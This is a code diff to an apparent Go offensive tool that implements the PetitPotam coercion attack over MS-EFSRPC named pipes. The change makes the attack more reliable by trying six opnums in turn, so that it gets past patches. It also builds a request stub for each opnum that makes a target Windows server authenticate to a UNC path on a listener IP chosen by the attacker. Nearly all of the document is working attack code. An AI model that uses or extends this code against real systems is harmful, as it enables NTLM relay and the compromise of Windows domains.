@@ -379,18 +379,37 @@ func main() {
 
 // executePetitPotam implements the PetitPotam coercion technique (MS-EFSRPC)
 // This is the VERIFIED WORKING implementation - do not modify without extensive testing
+//
+// PetitPotam tries multiple MS-EFSRPC opnums to maximize success rate:
+// - Opnum 0:  EfsRpcOpenFileRaw (often patched but still attempted)
+// - Opnum 4:  EfsRpcEncryptFileSrv (reliable fallback)
+// - Opnum 5:  EfsRpcDecryptFileSrv (alternative method)
+// - Opnum 6:  EfsRpcQueryUsersOnFile (info query coercion)
+// - Opnum 7:  EfsRpcQueryRecoveryAgents (recovery agent coercion)
+// - Opnum 12: EfsRpcFileKeyInfo (key info coercion)
+//
+// Each opnum triggers the server to authenticate to the UNC path in the FileName parameter.
+// The attack succeeds even if some opnums are patched, as long as one works.
 func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string) error {
 	fmt.Printf("[*] Using PetitPotam coercion technique via \\pipe\\%s\n", pipeName)
 
 	// Define PetitPotam method parameters
+	// Try all known MS-EFSRPC opnums that can trigger coercion
 	method := CoercionMethod{
 		Name:         "PetitPotam",
 		PipeName:     pipeName,
 		UUID:         "c681d488-d850-11d0-8c52-00c04fd90f7e",
 		MajorVersion: 1,
 		MinorVersion: 0,
-		Opnums:       []uint16{0, 4}, // Try EfsRpcOpenFileRaw (0), then EfsRpcEncryptFileSrv (4)
-		CreateStub:   createEfsRpcStub,
+		Opnums: []uint16{
+			0,  // EfsRpcOpenFileRaw (often patched)
+			4,  // EfsRpcEncryptFileSrv
+			5,  // EfsRpcDecryptFileSrv
+			6,  // EfsRpcQueryUsersOnFile
+			7,  // EfsRpcQueryRecoveryAgents
+			12, // EfsRpcFileKeyInfo
+		},
+		CreateStub: createEfsRpcStub,
 	}
 
 	// Open named pipe with read+write access
@@ -418,19 +437,34 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 	// CRITICAL: Try ALL opnums, don't stop early
 	// Original working code ALWAYS tried opnum 4 regardless of opnum 0 result
 	// One opnum may be patched while another works
+
+	// Map opnums to function names for clear output
+	opnumNames := map[uint16]string{
+		0:  "EfsRpcOpenFileRaw",
+		4:  "EfsRpcEncryptFileSrv",
+		5:  "EfsRpcDecryptFileSrv",
+		6:  "EfsRpcQueryUsersOnFile",
+		7:  "EfsRpcQueryRecoveryAgents",
+		12: "EfsRpcFileKeyInfo",
+	}
+
 	var lastErr error
 	successfulOpnum := -1
 	for _, opnum := range method.Opnums {
-		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)
+		funcName := opnumNames[opnum]
+		if funcName == "" {
+			funcName = "Unknown"
+		}
+		fmt.Printf("[-] Trying %s opnum %d (%s)...\n", method.Name, opnum, funcName)
 
 		stub := method.CreateStub(listenerIP, opnum)
 		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
 
 		if err != nil {
 			if err.Error() == "got fault 0x5" {
-				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
+				fmt.Printf("[-] Opnum %d (%s) returned ACCESS_DENIED (probably patched)\n", opnum, funcName)
 			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
-				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
+				fmt.Printf("[+] Opnum %d (%s) got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName)
 				successfulOpnum = int(opnum)
 			}
 			lastErr = err
@@ -439,9 +473,9 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 			// Opnum 0 (EfsRpcOpenFileRaw) often returns success when patched
 			// Patched versions return success without actually doing UNC access
 			if opnum == 0 {
-				fmt.Printf("[!] Opnum 0 returned success (likely PATCHED - may not trigger callback)\n")
+				fmt.Printf("[!] Opnum 0 (%s) returned success (likely PATCHED - may not trigger callback)\n", funcName)
 			} else {
-				fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
+				fmt.Printf("[+] Opnum %d (%s) completed successfully\n", opnum, funcName)
 			}
 			successfulOpnum = int(opnum)
 			lastErr = nil
@@ -1972,7 +2006,13 @@ func createNTLMSignature(auth *NTLMAuth, message []byte) []byte {
 }*/
 
 // createEfsRpcStub creates the NDR stub for MS-EFSRPC calls (PetitPotam)
-// Works for both EfsRpcOpenFileRaw (opnum 0) and EfsRpcEncryptFileSrv (opnum 4)
+// Supports multiple opnums with different parameter signatures:
+// - Opnum 0 (EfsRpcOpenFileRaw): FileName + Flag
+// - Opnum 4 (EfsRpcEncryptFileSrv): FileName only
+// - Opnum 5 (EfsRpcDecryptFileSrv): FileName + OpenFlag
+// - Opnum 6 (EfsRpcQueryUsersOnFile): FileName only
+// - Opnum 7 (EfsRpcQueryRecoveryAgents): FileName only
+// - Opnum 12 (EfsRpcFileKeyInfo): FileName + infoClass
 func createEfsRpcStub(listenerIP string, opnum uint16) []byte {
 	// Build UNC path with null terminator (required by MS-EFSRPC)
 	uncPath := "\\\\" + listenerIP + "\\test\\Settings.ini\x00"
@@ -2000,8 +2040,30 @@ func createEfsRpcStub(listenerIP string, opnum uint16) []byte {
 		buf.WriteByte(0x00)
 	}
 
-	// Flags parameter
-	binary.Write(&buf, binary.LittleEndian, uint32(0))
+	// Add additional parameters based on opnum
+	switch opnum {
+	case 0:
+		// EfsRpcOpenFileRaw: Flag parameter (ULONG)
+		binary.Write(&buf, binary.LittleEndian, uint32(0))
+	case 4:
+		// EfsRpcEncryptFileSrv: No additional parameters
+		// Just the filename
+	case 5:
+		// EfsRpcDecryptFileSrv: OpenFlag parameter (ULONG)
+		binary.Write(&buf, binary.LittleEndian, uint32(0))
+	case 6:
+		// EfsRpcQueryUsersOnFile: No additional parameters
+		// Just the filename
+	case 7:
+		// EfsRpcQueryRecoveryAgents: No additional parameters
+		// Just the filename
+	case 12:
+		// EfsRpcFileKeyInfo: infoClass parameter (DWORD)
+		binary.Write(&buf, binary.LittleEndian, uint32(0))
+	default:
+		// For any unknown opnums, try with just the filename
+		// This follows the most common pattern
+	}
 
 	return buf.Bytes()
 }
